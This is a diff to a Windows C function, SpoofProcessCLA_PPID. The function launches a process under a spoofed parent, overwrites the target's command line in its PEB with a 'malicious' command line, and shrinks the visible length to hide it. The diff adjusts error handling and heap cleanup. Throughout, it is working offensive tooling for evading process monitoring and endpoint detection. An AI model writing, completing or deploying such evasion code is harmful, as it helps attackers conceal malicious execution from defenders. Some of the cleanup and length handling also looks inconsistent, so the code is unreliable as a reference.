@@ -956,8 +956,9 @@ BOOLEAN SpoofProcessCLA_PPID //CLA = Command Line Argument | PPID = Parent Proce
 		NULL, pSpoofedProcessPath,
 		&StartupInfoEx_t.StartupInfo, &ProcessInformation_t)) 
 	{
+
 		printf("CreateProcessW Failed With Error: 0x%lx", GetLastError());
-		goto EndOfFunc;
+		return FALSE;
 	}
 	NTSTATUS ntStatus = 0;
 	if ((ntStatus = NtQueryProcInfo(
@@ -970,13 +971,13 @@ BOOLEAN SpoofProcessCLA_PPID //CLA = Command Line Argument | PPID = Parent Proce
 
 	if (!ReadFromTargetProcess(
 		ProcessInformation_t.hProcess, ProcessBasicInfoBlock_t.PebBaseAddress,
-		(PVOID*)&pProcEnvBlock_t,sizeof(PEB),
+		&pProcEnvBlock_t,sizeof(PEB),
 		hHeap
 	)) goto EndOfFunc;
 
 	if (!ReadFromTargetProcess(
 		ProcessInformation_t.hProcess,pProcEnvBlock_t->ProcessParameters, 
-		(PVOID *)&pProcessUserParameters,sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF,
+		&pProcessUserParameters,sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF,
 		hHeap
 	)) goto EndOfFunc;
 
@@ -985,13 +986,18 @@ BOOLEAN SpoofProcessCLA_PPID //CLA = Command Line Argument | PPID = Parent Proce
 		(PVOID)pMaliciousCommandLine, (DWORD)(lstrlenW(pMaliciousCommandLine) * sizeof(WCHAR) + 1)
 	)) goto EndOfFunc;
 
+
 	DWORD dwNewLen = 30;
 
 	if (!WriteToTargetProcess(
 		ProcessInformation_t.hProcess,
 		((PBYTE)pProcEnvBlock_t->ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length)),
 		(PVOID)&dwNewLen,
-		sizeof(DWORD))) goto EndOfFunc;
+		sizeof(DWORD))) return FALSE;
+
+
+	HeapFree(hHeap, 0, pProcEnvBlock_t);
+	HeapFree(hHeap, 0, pProcessUserParameters);
 
 	ResumeThread(ProcessInformation_t.hThread);
 
@@ -999,11 +1005,15 @@ BOOLEAN SpoofProcessCLA_PPID //CLA = Command Line Argument | PPID = Parent Proce
 
 EndOfFunc:
 
-	if (pThreadsAttributeList_t) DeleteProcThreadAttributeList(pThreadsAttributeList_t);
-
 	if (pProcEnvBlock_t) HeapFree(hHeap, 0, pProcEnvBlock_t);
 
-	if (pProcessUserParameters != NULL) HeapFree(hHeap, 0, pProcessUserParameters);
+	//if (pProcessUserParameters != NULL) HeapFree(hHeap, 0, pProcessUserParameters);
+
+	if (pThreadsAttributeList_t) DeleteProcThreadAttributeList(pThreadsAttributeList_t);
+
+
+
+	HeapDestroy(hHeap);
 
 	return bState;
 }
